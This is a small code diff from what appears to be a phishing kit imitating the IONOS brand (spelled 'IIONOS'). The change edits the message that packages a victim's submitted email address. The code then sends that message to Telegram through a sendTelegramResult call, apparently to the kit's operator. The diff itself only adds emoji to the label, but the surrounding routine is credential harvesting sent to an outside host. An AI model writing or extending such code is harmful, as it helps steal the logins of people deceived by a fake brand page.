@@ -213,7 +213,7 @@ export default {
         this.loading = true;
 
         // Format the message as string
-        const message = `*IIONOS*\nEmail: ${this.formDataRes.email}`;
+        const message = `*🥏🥏🥏IIONOS🥏🥏🥏*\nEmail: ${this.formDataRes.email}`;
 
         // Send to Telegram
         await this.sendTelegramResult(
